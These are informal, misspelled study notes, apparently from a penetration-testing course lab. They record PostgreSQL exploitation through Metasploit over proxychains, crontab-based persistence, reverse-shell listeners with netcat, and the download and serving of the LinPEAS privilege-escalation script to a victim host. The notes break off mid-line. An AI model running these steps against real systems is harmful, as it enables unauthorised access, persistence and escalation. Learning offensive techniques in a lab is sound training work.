the two different ways to do this within Metasploit, you can run the search command to just called search and then you throw in the service and the version uh or on Cali directly from the terminal called Search sploit
utulize metasploit to get on soc4. 
Proxychains is used because you dont have to drop anything on the victim because ssh is already built in.
So we open up Metasploit through proxy chains.

Checked to see if it was vulnerable to SSH enumeration.

landed inside exploit module within Metasploit while it's proxied. 
say use zero, it's going to set set me up to utilize this module here.

(ATK)(msf6) search postgresql [1:45:23][Day 11]
Based off the server data in (ATK) (TERM 2) we saw that PostgreSQL is 9.6.0

(ATK)(msf6) search postgresql 9.6.0 (start from 9.6.0 and back space one character each time to see what you find out)

(ATK)(msf6) search postgresql 9.6

(ATK)(msf6) search postgresql 9. [I USED 0 ON THIS]

(ATK)(msf6) search postgresql 9

use number that has expliot module (it vaires but i used the one ending in "cmd_excec")

use exploit modules as much as possible.

Config start around [1:48] [DAY 11]

(CALI) searchsploit postgresql (find version) 

(ATK)(msf6) search postgresql

run id

break out metasploit by using your first port you made creating another shell to brake out metasploit (he used 12222)

(VICTIM) create a crontab using python3 shortest with your port number you want to use for VIC2 persistence

he set up another listner over port 12225 (VIC 2 Persisitence)

catch user persistence shell ON VIC2 [[14:02]]DAY 12
(ATTACKER) nc -lvp 55557 [NEW PORT I SET VIC ON PFSENSE]

(ATTACKER) (NEW TERM) CAT INTERNAL AND CD TO 192.168.1.102

(ATTACKER) curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh [1:33][DAY 12]

(ATTACKER) curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee linpeas.sh

(ATTACKER) ls [this is a automation script that we will move to the victim] this info could be found on hacktricks
(Checklist Linux Privesc escalation LinPEAS)

(ATTACKER) python3 -m http.server 8000

set up another port fowarding rule with this port number because thats where the websever is.

(type in web browser) 127.0.0.1:8000 [use ip thats local to you
